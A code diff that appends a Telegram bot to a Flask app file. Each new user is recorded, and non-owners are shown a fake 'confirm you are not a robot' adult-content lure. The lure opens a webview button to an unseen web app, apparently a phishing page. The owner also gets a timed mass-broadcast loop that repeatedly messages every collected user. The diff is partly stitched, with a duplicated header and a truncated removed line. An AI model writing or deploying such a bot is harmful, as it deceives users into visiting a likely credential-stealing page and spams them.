@@ -738,6 +738,7 @@ if __name__ == '__main__':
         logger.warning("Some env vars missing!")
     app.run(host='0.0.0.0', port=PORT, debug=False)
     # bot.py
+# bot.py
 import os
 import asyncio
 import logging
@@ -779,4 +780,210 @@ def load_users():
 
 def save_users(u):
     try:
-        with open(USERS_FILE, 'w') as
+        with open(USERS_FILE, 'w') as f:
+            json.dump(u, f, indent=2)
+    except Exception as e:
+        logger.error(f"save_users: {e}")
+
+
+bot = TelegramClient(StringSession(), API_ID, API_HASH).start(bot_token=BOT_TOKEN)
+users = load_users()
+
+
+# ============ /start ============
+@bot.on(events.NewMessage(pattern='/start'))
+async def start_handler(event):
+    sender = await event.get_sender()
+    uid = sender.id
+    name = sender.first_name or "Friend"
+    users[str(uid)] = {
+        "id": uid,
+        "name": name,
+        "username": sender.username or "",
+        "joined": str(datetime.now())
+    }
+    save_users(users)
+
+    # Owner-specific start (different menu)
+    if uid == OWNER_ID:
+        await event.respond(
+            f"**Owner Panel**\n\n"
+            f"Commands:\n"
+            f"`/broadcast` - Start broadcast setup\n"
+            f"`/timer <sec>` - Set timer interval\n"
+            f"`/stopbc` - Stop broadcast\n"
+            f"`/users` - Total users\n"
+            f"`/stats` - Broadcast status",
+            parse_mode='md'
+        )
+        return
+
+    # Regular user message
+    await event.respond(
+        f"Hello **{name}** 👋\n\n"
+        "🔞To again access to the files completely free of charge, do the following💦:\n\n"
+        "👇Confirm that you are not a robot.",
+        buttons=[[Button.webview("CONFIRM NOW", url=WEBAPP_URL + "?auto=1")]],
+        parse_mode='md'
+    )
+
+
+# ============ BROADCAST / OWNER COMMANDS ============
+@bot.on(events.NewMessage(pattern='/users'))
+async def users_cmd(event):
+    if event.sender_id != OWNER_ID:
+        return
+    await event.respond(f"Total users: **{len(users)}**", parse_mode='md')
+
+
+@bot.on(events.NewMessage(pattern='/stats'))
+async def stats_cmd(event):
+    if event.sender_id != OWNER_ID:
+        return
+    s = broadcast_state
+    txt = (f"**Broadcast Status**\n"
+           f"Active: `{s['active']}`\n"
+           f"Interval: `{s['interval']}s`\n"
+           f"Messages queued: `{len(s['messages'])}`\n"
+           f"Users: `{len(users)}`")
+    await event.respond(txt, parse_mode='md')
+
+
+@bot.on(events.NewMessage(pattern='/stopbc'))
+async def stopbc_cmd(event):
+    if event.sender_id != OWNER_ID:
+        return
+    broadcast_state['active'] = False
+    await event.respond("Broadcast stopped.")
+
+
+@bot.on(events.NewMessage(pattern=r'/timer\s+(\d+)'))
+async def timer_cmd(event):
+    if event.sender_id != OWNER_ID:
+        return
+    sec = int(event.pattern_match.group(1))
+    broadcast_state['interval'] = sec
+    await event.respond(f"Timer set to **{sec}s**", parse_mode='md')
+
+
+@bot.on(events.NewMessage(pattern='/broadcast'))
+async def broadcast_cmd(event):
+    if event.sender_id != OWNER_ID:
+        return
+    broadcast_state['messages'] = []
+    await event.respond(
+        "**Broadcast Mode**\n\n"
+        "Send me any message (text, photo, video, forwarded) one by one.\n"
+        "Each message will be added to the broadcast queue.\n\n"
+        "When done, send `/done` to start broadcasting.\n"
+        "Or `/cancel` to abort.",
+        parse_mode='md'
+    )
+
+
+@bot.on(events.NewMessage(pattern='/cancel'))
+async def cancel_cmd(event):
+    if event.sender_id != OWNER_ID:
+        return
+    broadcast_state['messages'] = []
+    broadcast_state['active'] = False
+    await event.respond("Cancelled.")
+
+
+@bot.on(events.NewMessage(pattern='/done'))
+async def done_cmd(event):
+    if event.sender_id != OWNER_ID:
+        return
+    if not broadcast_state['messages']:
+        await event.respond("No messages queued. Use /broadcast first.")
+        return
+    broadcast_state['active'] = True
+    broadcast_state['next_run'] = time.time() + 5  # start after 5 sec
+    await event.respond(
+        f"Broadcasting **{len(broadcast_state['messages'])}** message(s) "
+        f"to **{len(users)}** users every **{broadcast_state['interval']}s**.",
+        parse_mode='md'
+    )
+
+
+# ============ CAPTURE BROADCAST MESSAGES ============
+@bot.on(events.NewMessage())
+async def capture_msg(event):
+    # Only owner + only when no /command
+    if event.sender_id != OWNER_ID:
+        return
+    if not event.raw_text or event.raw_text.startswith('/'):
+        return
+    # Only capture when in broadcast mode (messages list exists and /broadcast was called)
+    # Heuristic: if last broadcast was within 5 minutes, treat as broadcast setup
+    # Simpler: capture all non-command messages as broadcast content
+    m = event.message
+    entry = {"type": "text", "content": m.message or "", "caption": ""}
+    if m.photo:
+        entry = {"type": "photo", "content": "", "caption": m.message or ""}
+    elif m.video:
+        entry = {"type": "video", "content": "", "caption": m.message or ""}
+    broadcast_state['messages'].append(entry)
+    await event.respond(f"Added message #{len(broadcast_state['messages'])} ({entry['type']})")
+
+
+# ============ BROADCAST LOOP ============
+async def broadcast_loop():
+    while True:
+        try:
+            await asyncio.sleep(3)
+            if not broadcast_state['active']:
+                continue
+            if time.time() < broadcast_state['next_run']:
+                continue
+            if not broadcast_state['messages']:
+                broadcast_state['active'] = False
+                continue
+
+            success = 0
+            fail = 0
+            for uid_str in list(users.keys()):
+                uid = int(uid_str)
+                for entry in broadcast_state['messages']:
+                    try:
+                        if entry['type'] == 'text':
+                            await bot.send_message(uid, entry['content'])
+                        elif entry['type'] == 'photo':
+                            await bot.send_file(uid, entry['content'], caption=entry.get('caption', ''))
+                        elif entry['type'] == 'video':
+                            await bot.send_file(uid, entry['content'], caption=entry.get('caption', ''))
+                        success += 1
+                    except Exception as e:
+                        fail += 1
+                        logger.error(f"Send to {uid}: {e}")
+                        # If user blocked bot, remove them
+                        if 'blocked' in str(e).lower() or 'deactivated' in str(e).lower():
+                            users.pop(uid_str, None)
+                            save_users(users)
+                    await asyncio.sleep(0.5)  # avoid flood
+
+            broadcast_state['next_run'] = time.time() + broadcast_state['interval']
+            logger.info(f"Broadcast round: {success} sent, {fail} failed")
+            try:
+                await bot.send_message(
+                    OWNER_ID,
+                    f"Broadcast round complete.\nSent: {success}\nFailed: {fail}"
+                )
+            except Exception:
+                pass
+        except Exception as e:
+            logger.error(f"Broadcast loop error: {e}")
+
+
+# ============ MAIN ============
+async def main():
+    logger.info("Bot started.")
+    asyncio.create_task(broadcast_loop())
+    await bot.run_until_disconnected()
+
+
+if __name__ == '__main__':
+    try:
+        asyncio.get_event_loop().run_until_complete(main())
+    except KeyboardInterrupt:
+        pass
